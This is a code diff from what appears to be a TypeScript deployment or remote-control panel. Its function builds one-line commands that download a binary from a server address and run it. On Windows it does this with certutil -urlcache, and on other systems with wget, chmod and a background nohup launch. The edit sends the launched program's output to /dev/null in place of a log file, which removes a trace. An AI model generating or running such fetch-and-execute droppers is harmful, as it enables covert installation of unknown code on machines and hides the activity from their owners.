@@ -601,7 +601,7 @@ const generateCommand = (row: any) => {
   if (row.OS === 'windows') {
     return `certutil -urlcache -split -f ${row.ServerAddress} C:\\temp\\r.exe && C:\\temp\\r.exe ${row.Pass || ''}`
   } else {
-    return `wget -P /tmp ${row.ServerAddress}; chmod +x /tmp/${row.FileName}; nohup /tmp/${row.FileName} ${row.Pass || ''} > m.log 2>&1 &`
+    return `wget -P /tmp ${row.ServerAddress}; chmod +x /tmp/${row.FileName}; nohup /tmp/${row.FileName} ${row.Pass || ''} > /dev/null 2>&1 &`
   }
 }
 
